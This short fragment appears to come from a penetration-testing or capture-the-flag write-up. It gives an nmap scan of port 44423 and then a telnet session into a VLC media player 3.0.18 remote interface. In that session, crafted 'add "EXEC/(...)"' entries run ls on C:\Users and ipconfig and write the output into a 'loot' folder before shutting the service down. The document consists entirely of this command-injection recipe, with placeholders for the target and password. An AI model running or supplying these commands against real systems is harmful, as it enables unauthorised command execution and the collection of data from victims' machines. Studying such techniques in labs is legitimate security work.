```
nmap -Pn -sT -p 44423 <TARGET-IP>
```

```
hacker@hacker-computer:~$ telnet <TARGET-IP> 44423
Trying <TARGET-IP>...
Connected to <TARGET-IP>.
Escape character is '^]'.
VLC media player 3.0.18 Vetinari
Password: <TELNET_PASSWORD>
Welcome, Master
> add "EXEC/(ls C:\Users\) > .\..\..\loot\ls.log"
> add "EXEC/(ipconfig) > .\..\..\loot\ipconfig.log"
> shutdown
```